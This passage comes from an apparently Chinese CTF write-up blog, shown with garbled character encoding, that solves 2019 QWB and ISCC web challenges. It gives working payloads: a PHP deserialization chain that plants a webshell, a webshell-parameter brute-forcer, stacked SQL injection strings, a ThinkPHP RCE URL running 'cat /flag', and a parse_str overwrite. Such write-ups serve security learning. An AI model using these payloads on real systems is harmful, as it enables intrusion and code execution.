å¾ˆæ˜æ˜¾äº†ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨Register-\u0026gt;checker = Profileï¼Œåˆ©ç”¨Profile-\u0026gt;index()å»è§¦å‘Profileç±»ä¸­çš„__callé­”æœ¯æ–¹æ³•ã€‚\nä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°Profile.phpå½“ä¸­çš„__callæ–¹æ³•è°ƒç”¨çš„å‚æ•°æ˜¯\npublic function __call($name, $arguments) { if($this-\u0026gt;{$name}){ $this-\u0026gt;{$this-\u0026gt;{$name}}($arguments); } } é€šè¿‡æ–‡æ¡£æˆ‘ä»¬å¯ä»¥çŸ¥é“$nameæ˜¯ä¸å­˜åœ¨æ–¹æ³•çš„è°ƒç”¨çš„åå­—ï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯indexï¼Œ$argumentså°±æ˜¯ä¼ å…¥è°ƒç”¨æ–¹æ³•çš„å‚æ•°ï¼Œè¿™é‡Œå°±ä¸ºç©ºã€‚\nè€Œå½“ä½¿ç”¨$this-\u0026gt;indexçš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šè§¦å‘å¦ä¸€ä¸ªé­”æœ¯æ–¹æ³•__get\n â€‹\tè¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ__get() ä¼šè¢«è°ƒç”¨ã€‚\n æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åˆå› ä¸ºifåˆ¤æ–­ä¸­è°ƒç”¨äº†$this-\u0026gt;{$name}ï¼Œè€Œå½“$this-\u0026gt;{$name}ä¸å­˜åœ¨çš„æ—¶å€™è§¦å‘äº†__getï¼Œé‚£æˆ‘ä»¬å†ä»”ç»†çœ‹çœ‹__getæ–¹æ³•\npublic function __get($name) { return $this-\u0026gt;except[$name]; } è¿™é‡Œåˆè°ƒç”¨äº†$this-\u0026gt;except[$name]ï¼Œè€Œ$nameæˆ‘ä»¬å¯ä»¥é€šè¿‡__callè°ƒç”¨çš„å€¼ç¡®å®šä¸ºindexï¼Œè€Œä¸”Profileç±»å­˜åœ¨ä¸€ä¸ªå…¬æœ‰ç±»exceptå¯ä»¥ä¾›æˆ‘ä»¬ä¿®æ”¹ã€‚\næ¥ç€åˆ©ç”¨_getçš„è¿”å›ä¼šä½¿__callæ–¹æ³•ä¸­çš„ifä¸ºçœŸï¼Œæ‰§è¡Œ$this-\u0026gt;{$this-\u0026gt;{$name}}($arguments);\nè¿™é‡Œæˆ‘å¤§æ¦‚ç®€åŒ–äº†ä¸€ä¸‹ä»£ç ï¼š\n \nç»“æœå¦‚ä¸‹ï¼Œè¿™æ ·è¿™ä¸ªæ„é€ é“¾å°±æ¯”è¾ƒæ¸…æ¥šäº†ã€‚\n \næ—¢ç„¶æœ‰äº†æ„é€ é“¾ï¼Œé‚£æˆ‘ä»¬å¯ä»¥æ€ä¹ˆåšå‘¢ï¼Ÿåœ¨Profileç±»ä¸­æˆ‘ä»¬è¿˜å¯ä»¥å‘ç°ä¸Šä¼ åŠŸèƒ½çš„æ–¹æ³•æœ‰è¿™æ ·çš„ä»£ç ï¼š\nif(!empty($_FILES)){ $this-\u0026gt;filename_tmp=$_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $this-\u0026gt;filename=md5($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]).\u0026#34;.png\u0026#34;; $this-\u0026gt;ext_check(); } if($this-\u0026gt;ext) { if(getimagesize($this-\u0026gt;filename_tmp)) { @copy($this-\u0026gt;filename_tmp, $this-\u0026gt;filename); @unlink($this-\u0026gt;filename_tmp); $this-\u0026gt;img=\u0026#34;../upload/$this-\u0026gt;upload_menu/$this-\u0026gt;filename\u0026#34;; $this-\u0026gt;update_img(); }else{ $this-\u0026gt;error(\u0026#39;Forbidden type!\u0026#39;, url(\u0026#39;../index\u0026#39;)); } }else{ $this-\u0026gt;error(\u0026#39;Unknow file type!\u0026#39;, url(\u0026#39;../index\u0026#39;)); } å¦‚æœæˆ‘ä»¬ä¸ä¸Šä¼ æ–‡ä»¶ï¼Œå°±å¯ä»¥ç›´æ¥ç»•è¿‡ç¬¬ä¸€ä¸ªifåˆ¤æ–­ï¼Œç›´æ¥ç”¨èµ‹å€¼ç»•è¿‡ç¬¬äºŒä¸ªifåˆ¤æ–­ï¼Œç„¶åå¯ä»¥æ„é€ å›¾ç‰‡é©¬ç»•è¿‡getimagesizeçš„åˆ¤æ–­ï¼Œæ§åˆ¶$this-\u0026gt;filenameä¸º php webshell å½¢å¼ï¼Œè¿™æ ·åˆ©ç”¨copy($this-\u0026gt;filename_tmp, $this-\u0026gt;filename)å°±å¯ä»¥è®©æœåŠ¡ç»™æˆ‘å¤åˆ¶å‡ºäº†ä¸€ä¸ª php webshell äº†ã€‚\nå¥½äº†åŸºæœ¬æ„é€ æ”»å‡»é“¾æ¥éƒ½åŸºæœ¬è®¾è®¡å¥½äº†ã€‚æ¥ä¸‹æ¥å°±æ˜¯æ€ä¹ˆè§¦å‘æ”»å‡»é“¾äº†ï¼Œæœ€å¼€å§‹çš„æºå¤´å°±æ˜¯ä»Registerç±»çš„__destructæ–¹æ³•å¼€å§‹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥ååºåˆ—åŒ–Registerçš„åœ°æ–¹ã€‚\nåœ¨Index.phpä¸­æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°\npublic function login_check(){ $profile=cookie(\u0026#39;user\u0026#39;); if(!empty($profile)){ $this-\u0026gt;profile=unserialize(base64_decode($profile)); $this-\u0026gt;profile_db=db(\u0026#39;user\u0026#39;)-\u0026gt;where(\u0026#34;ID\u0026#34;,intval($this-\u0026gt;profile[\u0026#39;ID\u0026#39;]))-\u0026gt;find(); if(array_diff($this-\u0026gt;profile_db,$this-\u0026gt;profile)==null){ return 1; }else{ return 0; } } } å¯ä»¥çœ‹åˆ°å°±æ˜¯é€šè¿‡cookieè¿›è¡Œä¼ å€¼è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚æ‰€ä»¥æˆ‘ä»¬åŸºæœ¬ä¸Šæ‰€æœ‰çš„æ”»å‡»å°±å¯ä»¥å®Œæˆäº†ã€‚é€šè¿‡å¦‚ä¸‹ä»£ç ç”Ÿæˆ cookie ï¼Œåœ¨é¦–é¡µæ›¿ä»£ cookie å°±è¡Œäº†ï¼Œå³ä½¿è¿”å›é”™è¯¯ï¼Œä¹Ÿæ²¡å…³ç³»ï¼Œåªè¦æŠŠæ–‡ä»¶copyäº†å°±è¡Œäº†\nclass Index extends Controller { public $profile; public $profile_db; } class Register extends Controller { public $checker=true; public $registed; } class Profile extends Controller { public $checker=false; public $filename_tmp=\u0026#34;upload/da5703ef349c8b4ca65880a05514ff89/f78492f0513c659e69dab2e47f567202.png\u0026#34;; public $filename=\u0026#34;upload/sh.php\u0026#34;; public $upload_menu; public $ext=1; public $img; public $except=array(\u0026#34;index\u0026#34;=\u0026gt;\u0026#34;upload_img\u0026#34;); } $index =new Index(); $reg = new Register(); $reg-\u0026gt;checker = new Profile(); $index-\u0026gt;profile = $reg; print_r(urlencode(base64_encode(serialize($reg)))); å¾—åˆ° php websehll\nYToxOntzOjI6IklEIjtPOjI3OiJhcHBcd2ViXGNvbnRyb2xsZXJcUmVnaXN0ZXIiOjg6e3M6NzoiY2hlY2tlciI7TzoyNjoiYXBwXHdlYlxjb250cm9sbGVyXFByb2ZpbGUiOjEzOntzOjc6ImNoZWNrZXIiO2I6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6NzY6InVwbG9hZC9kYTU3MDNlZjM0OWM4YjRjYTY1ODgwYTA1NTE0ZmY4OS9mNzg0OTJmMDUxM2M2NTllNjlkYWIyZTQ3ZjU2NzIwMi5wbmciO3M6ODoiZmlsZW5hbWUiO3M6MTM6InVwbG9hZC9zaC5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtpOjE7czozOiJpbWciO047czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czoxMDoidXBsb2FkX2ltZyI7fXM6NzoiACoAdmlldyI7TjtzOjEwOiIAKgByZXF1ZXN0IjtOO3M6MTY6IgAqAGZhaWxFeGNlcHRpb24iO2I6MDtzOjE2OiIAKgBiYXRjaFZhbGlkYXRlIjtiOjA7czoxOToiACoAYmVmb3JlQWN0aW9uTGlzdCI7YTowOnt9czoxMzoiACoAbWlkZGxld2FyZSI7YTowOnt9fXM6ODoicmVnaXN0ZWQiO047czo3OiIAKgB2aWV3IjtOO3M6MTA6IgAqAHJlcXVlc3QiO047czoxNjoiACoAZmFpbEV4Y2VwdGlvbiI7YjowO3M6MTY6IgAqAGJhdGNoVmFsaWRhdGUiO2I6MDtzOjE5OiIAKgBiZWZvcmVBY3Rpb25MaXN0IjthOjA6e31zOjEzOiIAKgBtaWRkbGV3YXJlIjthOjA6e319fQ%3D%3D  \nè¿ä¸Šå»å°±å¯ä»¥cat /flagäº†\né«˜æ˜çš„é»‘å®¢ æ‹¿åˆ°é¢˜ç›®ï¼Œæœ‰ www.tar.gz é™„ä»¶ï¼Œä½†æ˜¯è§£å‹ç¼©å‡ºæ¥æœ‰å¾ˆå¤š php æ–‡ä»¶ï¼Œæ‰“å¼€ä»”ç»†çœ‹éƒ½æ˜¯ç»è¿‡æ··æ·†çš„ã€‚ä¸€å¼€å§‹æ²¡ä»€ä¹ˆæ€è·¯ï¼Œç„¶åéšä¾¿ä»”ç»†å®¡äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œå‘ç°éƒ½æ˜¯å‡é©¬\nå­˜åœ¨æœ‰\necho `$_GET[\u0026#39;xxx\u0026#39;]`; system($_GET[\u0026#39;xxx\u0026#39;]); assert($_GET[\u0026#39;xxx\u0026#39;]); exec($_GET[\u0026#39;xxx\u0026#39;]); eval($_GET[\u0026#39;xxx\u0026#39;] ?? \u0026#39; \u0026#39;); ä½†æ˜¯è§¦å‘æ¡ä»¶éƒ½æå…¶æ¶å¿ƒï¼Œæ•…æ„ä¸è®©ä½ è§¦å‘ï¼Œæœ‰ç±»ä¼¼\nif(\u0026#39;xMpdxjdRB\u0026#39; == \u0026#39;TgjMxZujP\u0026#39;) eval($_GET[\u0026#39;xMpdxjdRB\u0026#39;] ?? \u0026#39; \u0026#39;); è¿™æ ·æˆ–è€…è¿™æ ·\n$_GET[\u0026#39;_5onXTD_C\u0026#39;] = \u0026#39; \u0026#39;; eval($_GET[\u0026#39;_5onXTD_C\u0026#39;] ?? \u0026#39; \u0026#39;); åæ­£å°±æ˜¯ä¸€ç³»åˆ—ä¸è®©ä½ ç›´æ¥æ‹¿åˆ° webshell çš„æ“ä½œï¼Œæ„Ÿè§‰åº”è¯¥å°±æ˜¯åœ¨æ··æ·†çœŸçš„ webshell äº†ã€‚\næ—¢ç„¶æ˜¯æ··æ·†çœŸçš„ webshell ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥å†™ä¸ªè„šæœ¬åˆ¶å®šä¸€äº›è§„åˆ™éå†ä¸€ä¸‹æ‰€æœ‰æ–‡ä»¶å‘¢ï¼Ÿä¾‹å¦‚åˆ©ç”¨ç¼–è¯‘åŸç† LL1 æ–‡æ³•ï¼Œå»ä»–ä¹ˆçš„ç¼–è¯‘åŸç†ï¼Œå†™ä¸ªğŸ”¨çš„è§„åˆ™ï¼Œåæ­£è¦æ‰¾æœ€ç»ˆçš„ webshell ï¼Œå¹²è„†å…ˆç›´æ¥æ‰¾æ‰€æœ‰çš„ $_GET æˆ–è€… $_POST å˜é‡ï¼Œç›´æ¥æš´åŠ›ä¼ å‚æ¢æµ‹ï¼Œçœ‹æ˜¯å¦æœ‰ webshell æ‰§è¡Œå‘½ä»¤çš„å›æ˜¾å°±å¥½äº†ã€‚\nä¸è¿‡è¿™å¥½æ— èŠå“¦â€¦è„šæœ¬å¦‚ä¸‹\u0026hellip;\nimport os import re import requests filePath = \u0026#39;/Users/zedd/Sites/web2/src\u0026#39; files = os.listdir(filePath) url = \u0026#34;http://localhost/web2/src/\u0026#34; def get_rep(filename, name): r_url = url + filename + \u0026#34;?\u0026#34; + name + \u0026#34;=echo `id`;\u0026#34; rep = requests.get(r_url) print(r_url) if \u0026#39;uid=501\u0026#39; in rep.content.decode(\u0026#39;utf-8\u0026#39;): print(\u0026#34;Got It! !!!!!!! \u0026#34; + filename + \u0026#34; The param is: _GET[\u0026#34; + name +\u0026#34;]\u0026#34;) def post_rep(filename, name): r_url = url + filename param = { name: \u0026#34;echo `id`;\u0026#34; } rep = requests.post(r_url, data=param) print(r_url + \u0026#34; POST: \u0026#34; + name) if \u0026#39;uid=501\u0026#39; in rep.content.decode(\u0026#39;utf-8\u0026#39;): print(\u0026#34;Got It! !!!!!!! \u0026#34; + filename + \u0026#34; The param is: _POST[\u0026#34; + name +\u0026#34;]\u0026#34;) for k in files: if k == \u0026#39;.DS_Store\u0026#39;: continue if k == \u0026#39;index.html\u0026#39;: continue with open(\u0026#39;./src/\u0026#39; + k, \u0026#39;rt\u0026#39;) as f: content = f.read() get = re.findall(r\u0026#34;GET\\[\u0026#39;(.+?)\u0026#39;\\]\u0026#34;, content) post = re.findall(r\u0026#34;POST\\[\u0026#39;(.+?)\u0026#39;\\]\u0026#34;, content) for i in get: get_rep(k, i) for i in post: post_rep(k, i) f.close() ç¬¬ä¸€å¤©è¿˜è·‘é”™æ–‡ä»¶ä½ç½®äº†ï¼Œå¯¼è‡´è‡ªå·±è·‘äº†å¥½å‡ ééƒ½æ²¡å‡ºæ¥ï¼Œå¼€å§‹æ€€ç–‘è‡ªå·±â€¦ç¬¬äºŒå¤©æ¸…é†’äº†ä»¥åï¼Œä»”ç»†çœ‹æ‰å‘ç°åŸæ¥æ–‡ä»¶ä½ç½®å†™é”™äº†\u0026hellip;ç„¶åæ‰è·‘å‡ºæ¥\n \nä½ çœ‹è¿™ä¸ªæ–‡ä»¶æ˜¯å¾—æœ‰å¤šå¯æ°”å•Šï¼ä½ çœ‹è¿™ä¸ªé»‘å®¢æ˜¯æœ‰å¤šå¯æ°”å•Šï¼\nè¿ä¸Šå»cat /flagå°±æ‹¿åˆ° flag äº†\néšä¾¿æ³¨ ä¸€ä¸ªæ³¨å…¥é¢˜â€¦ fuzz äº†ä¸€ä¸‹ï¼Œå‘ç°å›æ˜¾è¿‡æ»¤äº†\nreturn preg_match(\u0026#34;/select|update|delete|drop|insert|where|\\./i\u0026#34;, $inject); ä½†æ˜¯è®²é“ç†ï¼Œè¿‡æ»¤äº†selectï¼Œæ˜¯æ— æ³•é€šè¿‡å¸¸è§„æ“ä½œæ³¨å…¥å»æ‹¿ flag çš„ï¼Œäºæ˜¯è€ƒè™‘æ˜¯ä¸æ˜¯ä¸éœ€è¦æ‹¿æ•°æ®åº“ï¼Œå°±æ˜¯å•çº¯è¯»æ–‡ä»¶ä»€ä¹ˆçš„æ“ä½œã€‚\nå¯ä»¥æŠ¥é”™ï¼Œå°è¯•ä½¿ç”¨ä»¥ä¸‹è¯»æ–‡ä»¶ï¼Œæ— æœ\n1\u0026#39; and extractvalue(1, concat(0x7e, (LOAD_FILE(\u0026#39;/etc/passwd\u0026#39;)),0x7e)); 1\u0026#39;and(extractvalue(1,concat(0x7e,(isnull(\u0026#39;/etc/passwd\u0026#39;)),0x7e)))#è¿™é‡Œç¥å¥‡çš„äº‹isnullï¼Œæ— è®ºæ–‡ä»¶å­˜ä¸å­˜åœ¨éƒ½è¿”å›äº† 0 \u0026hellip;\næœç´¢è¿‡æ»¤çš„å…³é”®å­—ï¼Œåœ¨çº¢æ—¥ä»£ç å®¡è®¡é‚£ä¸ªæ‰¾åˆ°ç±»ä¼¼çš„ï¼Œç”¨é‚£ä¸ªçš„æ€è·¯å°è¯• HPP ï¼Œæ— æœã€‚\næœåˆ° 2018 SUCTF ä¸­ä¹Ÿæœ‰ç±»ä¼¼çš„å…³é”®å­—è¿‡æ»¤ï¼Œå‘ç°é‚£é“é¢˜å¯ä»¥é€šè¿‡ç±»ä¼¼ä»¥ä¸‹çš„ payload å †å è¾¾åˆ°æ³¨å…¥æ•ˆæœ\nset@t=0x73656c65637420312c323b;preparexfrom@t;executex;ä½†æ˜¯å°è¯•çš„æ—¶å€™å‘ç°è¿‡æ»¤å›æ˜¾\nstrstr($inject, \u0026#34;set\u0026#34;) \u0026amp;\u0026amp; strstr($inject, \u0026#34;prepare\u0026#34;) æƒ³äº†å¥½ä¸€ä¼šï¼Œçªç„¶å‘ç°è¿™æ˜¯ä¸ªstrstrå‡½æ•°å‘€ï¼å¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡ï¼\nä½†æ˜¯é¢˜ç›®å¯èƒ½å“ªé‡Œå‡ºäº†é—®é¢˜ï¼Œå¥½å‡ æ¬¡æ‹¿åˆ° flag å­—æ®µå†…å®¹éƒ½ä¸ºç©º\u0026hellip;æˆ‘è§‰å¾—æ²¡ä»€ä¹ˆé—®é¢˜â€¦å°è¯•äº†å¥½å‡ ä¸ª payload ï¼Œä¹Ÿé—®äº†å®¢æœï¼Œå®¢æœè¯´æ²¡é—®é¢˜â€¦åˆéšä¾¿è¯•äº†å‡ ä¸ªç»ˆäºå‡ºäº†\u0026hellip;\nselect*fromsupersqli.19198109311145141919810931114514select*from19198109311145141\u0026#39;;Set @t=0x73656c65637420666c61672066726f6d2031393139383130393331313134353134;Prepare x from @t;Execute x;# 1\u0026#39;;Set@t=0x73656c656374202a2066726f6d2031393139383130393331313134353134;Preparexfrom@t;Executex;#1\u0026#39;;Set @t=0x73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134;Prepare x from @t;Execute x;#  \nBonus è¿˜å¯ä»¥æœ‰\nRENAMETABLE`words`TO`words1`;RENAMETABLE`1919810931114514`TO`words`;ALTERTABLE`words`CHANGE`flag``id`VARCHAR(100)CHARACTERSETutf8COLLATEutf8_general_ciNOTNULL;showcolumnsfromwords;#è¿™ç§é‡å‘½åçš„è§£æ³•ã€‚\næ•´ä¸ªè§£æ³•çš„æ„æ€å°±æ˜¯æŠŠ words è¿™å¼ è¡¨æ”¹æˆ words1 ï¼ŒæŠŠå­˜åœ¨ flag çš„è¡¨ 1919810931114514 æ”¹æˆ wordsï¼Œå› ä¸ºé»˜è®¤çš„ web æ˜¯ä» words è¡¨ä¸­æŸ¥æ•°æ®çš„ï¼Œè¿™æ ·ä¸€æ”¹ï¼Œå°±ä¸éœ€è¦æˆ‘ä»¬å»selectå¦ä¸€å¼ è¡¨äº†ã€‚æ‰€ä»¥æ¥ä¸‹æ¥å°±æ˜¯æŠŠ flag çš„è¡¨çš„å­—æ®µæ”¹æˆåŸæ¥ words è¡¨çš„å­—æ®µå°±å¯ä»¥äº†ã€‚\næœ€åå¯ä»¥é€šè¿‡1 or 1=1#è¿™æ ·çš„æŠŠæ‰€æœ‰çš„æ•°æ®æŸ¥å‡ºæ¥äº†ï¼Œè¿™æ—¶å€™çš„ words è¡¨å°±æ˜¯ flag å­˜åœ¨çš„è¡¨äº†ã€‚\nå¼ºç½‘å…ˆé”‹-ä¸Šå• æ‰“å¼€å‘ç°å¯ä»¥åˆ—ç›®å½•ï¼Œåœ¨http://117.78.39.172:30280/1/runtime/log/201903/12.logæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰ä¸€æ®µ log\n--------------------------------------------------------------- [ 2019-03-12T23:18:49+08:00 ] 223.104.19.11 GET 39.105.136.196:8000/?s=index/\\think\\app/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=phpinfo\u0026amp;vars[1][]=1 [ error ] [0]variable type erroré”›ï¿½ boolean --------------------------------------------------------------- [ 2019-03-12T23:18:53+08:00 ] 42.236.10.84 GET 39.105.136.196:8000/?s=index/\\think\\app/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=phpinfo\u0026amp;vars[1][]=1 [ error ] [0]variable type erroré”›ï¿½ boolean --------------------------------------------------------------- [ 2019-03-12T23:19:52+08:00 ] 223.104.19.11 GET 39.105.136.196:8000/?s=index/\\think\\Request/input\u0026amp;filter=system\u0026amp;data=whoami [ error ] [0]Access to non-public constructor of class think\\Request --------------------------------------------------------------- [ 2019-03-12T23:23:59+08:00 ] 223.104.19.11 get /?s=captcha [ error ] [2]system(): Cannot execute a blank command å‘ç°æ˜¯ tp çš„ rce logï¼Œç›´æ¥æ‹¿å»æ‰“http://117.78.39.172:30280/1/public/?s=index/\\think\\app/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=system\u0026amp;vars[1][]=cat /flag\næ‹¿åˆ° flag\nConclusion Web éƒ½æ¯”è¾ƒéš¾ï¼Œè´¨é‡éƒ½è¿˜æ˜¯ä¸é”™çš„ã€‚æˆ‘è§‰å¾—ç¬¬ä¸€ä¸ªé¢˜ upload æ•´ä¸ªæ„é€ é“¾è¿˜æ˜¯éœ€è¦ä¸€å®šæŠ€å·§çš„ï¼ŒBut çœ‹åˆ°ä¸€äº› wp ç›´æ¥ä¸‰è¨€ä¸¤è¯­å°±å¸¦è¿‡äº†â€¦å•§å•§\u0026hellip;è¿˜æ˜¯å­¦åˆ°äº†ä¸€äº›çŸ¥è¯†çš„\nå†è´´ä¸€å‡ ä¸ªæˆ‘æ”¶é›†åˆ°çš„ wp å§\nbabywebbb\næ™ºèƒ½é—¨é”\n","date":"2019-06-04T00:23:52Z","permalink":"https://blog.zeddyu.info/2019/06/04/2019qwb/","title":"2019å¼ºç½‘æ¯éƒ¨åˆ†Web wp"},{"content":"2019 ISCC Web wpï¼Œæ²¡ä»€ä¹ˆå¤ªå¤§æ„ä¹‰â€¦åŸé¢˜æ¯”è¾ƒå¤š\u0026hellip;æ²¡å­¦åˆ°å•¥\u0026hellip;\nWeb Web1 \u0026lt;?php error_reporting(0); require \u0026#39;flag.php\u0026#39;; $value = $_GET[\u0026#39;value\u0026#39;]; $password = $_GET[\u0026#39;password\u0026#39;]; $username = \u0026#39;\u0026#39;; for ($i = 0; $i \u0026lt; count($value); ++$i) { if ($value[$i] \u0026gt; 32 \u0026amp;\u0026amp; $value[$i] \u0026lt; 127) unset($value); else $username .= chr($value[$i]); if ($username == \u0026#39;w3lc0me_To_ISCC2019\u0026#39; \u0026amp;\u0026amp; intval($password) \u0026lt; 2333 \u0026amp;\u0026amp; intval($password + 1) \u0026gt; 2333) { echo \u0026#39;Hello \u0026#39;.$username.\u0026#39;!\u0026#39;, \u0026#39;\u0026lt;br\u0026gt;\u0026#39;, PHP_EOL; echo $flag, \u0026#39;\u0026lt;hr\u0026gt;\u0026#39;; } } highlight_file(__FILE__); http://39.100.83.188:8001/?value[]=375\u0026amp;value[]=307\u0026amp;value[]=364\u0026amp;value[]=355\u0026amp;value[]=304\u0026amp;value[]=365\u0026amp;value[]=357\u0026amp;value[]=351\u0026amp;value[]=340\u0026amp;value[]=367\u0026amp;value[]=351\u0026amp;value[]=329\u0026amp;value[]=339\u0026amp;value[]=323\u0026amp;value[]=323\u0026amp;value[]=306\u0026amp;value[]=304\u0026amp;value[]=305\u0026amp;value[]=313\u0026amp;password=2332e1 Web2 æç¤ºç ´è§£3ä½æ•°å­—å¯†ç ï¼Œå¯ä»¥å†™è„šæœ¬æ¥è·‘ï¼Œç”±äºä»–çš„éªŒè¯ç æ˜¯æ¯æ¬¡ GET ä¸€æ¬¡å°±åˆ·ä¸€æ¬¡ï¼ŒéªŒè¯ç å¤„ç†è¿™å—ä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œå­¦ä¹ äº†ä¸€æ³¢éªŒè¯ç çš„å¤„ç†è¯†åˆ«ä¸ selenuim çˆ¬è™«çš„çŸ¥è¯†ï¼Œå†™äº†ä¸ªåŠæˆå“ï¼Œä½†æ˜¯è²Œä¼¼è¿™ä¸ªå¤„ç† response ä¸å¤ªå¥½å¤„ç†ï¼Œæœ€åç›²çŒœ 996 æ‹¿åˆ° flag\nimport pytesseract import requests import time from PIL import Image from selenium import webdriver \u0026#39;\u0026#39;\u0026#39; è°ƒç”¨æ¥å£è¯·æ±‚éªŒè¯ç ï¼Œä¿å­˜åˆ°æœ¬åœ°ï¼Œè¯†åˆ«éªŒè¯ï¼Œæ£€æŸ¥è¯†åˆ«çš„éªŒè¯ç å¯¹ä¸å¯¹ã€‚ \u0026#39;\u0026#39;\u0026#39; driver = webdriver.Chrome() driver.get(\u0026#34;http://39.100.83.188:8002/\u0026#34;) driver.add_cookie({ \u0026#39;domain\u0026#39;: \u0026#39;39.100.83.188:8002\u0026#39;, \u0026#39;name\u0026#39;: \u0026#39;PHPSESSID\u0026#39;, \u0026#39;value\u0026#39;: \u0026#39;alsrko26h2mlbmkgv54r4gpcf3\u0026#39;, \u0026#39;path\u0026#39;: \u0026#39;/\u0026#39;, \u0026#39;expires\u0026#39;: None }) driver.get(\u0026#34;http://39.100.83.188:8002/\u0026#34;) # æ¯”è¾ƒå¥½ç†è§£ã€æˆªå›¾å¹¶ä¿å­˜åˆ°è¿™ä¸ªè·¯å¾„ driver.get_screenshot_as_file(\u0026#39;./screenshoot.png\u0026#39;) # driver.close() # æ‰“å¼€åˆšåˆšä¿å­˜çš„å›¾ç‰‡ im = Image.open(\u0026#39;./screenshoot.png\u0026#39;) # è®¾ç½®è¦è£å‰ªçš„åŒºåŸŸï¼ˆéªŒè¯ç æ‰€åœ¨çš„åŒºåŸŸï¼‰ box = (0, 200, 130, 300) # æˆªå›¾ï¼Œç”Ÿæˆåªæœ‰éªŒè¯ç çš„å›¾ç‰‡ region = im.crop(box) # ä¿å­˜åˆ°æœ¬åœ°è·¯å¾„ region.save(\u0026#34;./code.png\u0026#34;) # è¯»å–éªŒè¯ç å›¾ç‰‡ image = Image.open(\u0026#34;./code.png\u0026#34;) # å¼€å§‹è¯†åˆ«éªŒè¯ç  optCode = pytesseract.image_to_string(image) # æ‰“å°å‡ºéªŒè¯ç  print(\u0026#34;éªŒè¯ç ï¼š\u0026#34;, optCode) password = \u0026#39;999\u0026#39; driver.find_element_by_name(\u0026#34;pwd\u0026#34;).send_keys(password) driver.find_element_by_name(\u0026#34;user_code\u0026#34;).send_keys(optCode) driver.find_element_by_name(\u0026#34;Login\u0026#34;).click() print(driver) åæ¥çœ‹å…¶ä»–å¸ˆå‚…ï¼Œå¯ä»¥æŠŠ cookie åˆ æ‰æ¥è¾¾åˆ°çˆ†ç ´å¯†ç \nWeb3 æ„Ÿè§‰æ˜¯æŠŠ sql-lab äºŒæ¬¡æ³¨å…¥çš„é¢˜ç›®ç»™æ‹¿äº†ä¸Šæ¥ï¼Œå°±æ˜¯åˆ©ç”¨æ³¨å†Œadmin'#æ¥æ›´æ”¹ç®¡ç†å‘˜è´¦å·å¯†ç çš„é‚£ä¸ªé¢˜\nä½†æ˜¯è²Œä¼¼è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œä½†æ˜¯ç®¡ä»–ä¹ˆå¤šï¼Œå¸ˆå‚…ä»¬éƒ½æ˜¯æ‡’çš„ï¼Œç›´æ¥ç”¨admin/123456ä¸Šå»æ‹¿åˆ° flag\nçœ‹äº†å…¶ä»–å¸ˆå‚…çš„wpï¼Œå¯ä»¥é€šè¿‡admin'--xxæ¥äºŒæ¬¡æ³¨å…¥ï¼Œå¥‡æ€ªçš„æ˜¯å½“æ—¶æˆ‘å¹¶æ²¡æœ‰æˆåŠŸ\u0026hellip;å¯èƒ½å¹¶å‘ç¡®å®å¤ªå¤šäº†\u0026hellip;\nWeb4 ä»£ç å®¡è®¡é¢˜\n\u0026lt;?php error_reporting(0); include(\u0026#34;flag.php\u0026#34;); $hashed_key = \u0026#39;ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a\u0026#39;; $parsed = parse_url($_SERVER[\u0026#39;REQUEST_URI\u0026#39;]); if(isset($parsed[\u0026#34;query\u0026#34;])){ $query = $parsed[\u0026#34;query\u0026#34;]; $parsed_query = parse_str($query); if($parsed_query!=NULL){ $action = $parsed_query[\u0026#39;action\u0026#39;]; } if($action===\u0026#34;auth\u0026#34;){ $key = $_GET[\u0026#34;key\u0026#34;]; $hashed_input = hash(\u0026#39;sha256\u0026#39;, $key); if($hashed_input!==$hashed_key){ die(\u0026#34;\u0026lt;img src=\u0026#39;cxk.jpg\u0026#39;\u0026gt;\u0026#34;); } echo $flag; } }else{ show_source(__FILE__); }?\u0026gt;åˆæ˜¯ä¸€ä¸ªåŸé¢˜ï¼Œåˆ©ç”¨pase_strå‡½æ•°çš„ç‰¹æ€§ï¼š\n{% colorquote success %}\nparse_str ( string $encoded_string [, array \u0026amp;$result ] ) : void\nå¦‚æœ encoded_string æ˜¯ URL ä¼ é€’å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery stringï¼‰ï¼Œåˆ™å°†å®ƒè§£æä¸ºå˜é‡å¹¶è®¾ç½®åˆ°å½“å‰ä½œç”¨åŸŸï¼ˆå¦‚æœæä¾›äº† result åˆ™ä¼šè®¾ç½®åˆ°è¯¥æ•°ç»„é‡Œ ï¼‰ã€‚\n{% endcolorquote %}\nä¼ å…¥hashed_keyè¦†ç›–æ‰hased_keyå³å¯\nPayload:\naction=auth\u0026amp;key=test\u0026amp;hashed_key=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 Web5 http://39.100.83.188:8054/\nè„‘æ´é¢˜\u0026hellip;è„‘æ´å¯¹ä¸ä¸Š\u0026hellip;\nå‚è€ƒ2019iscc 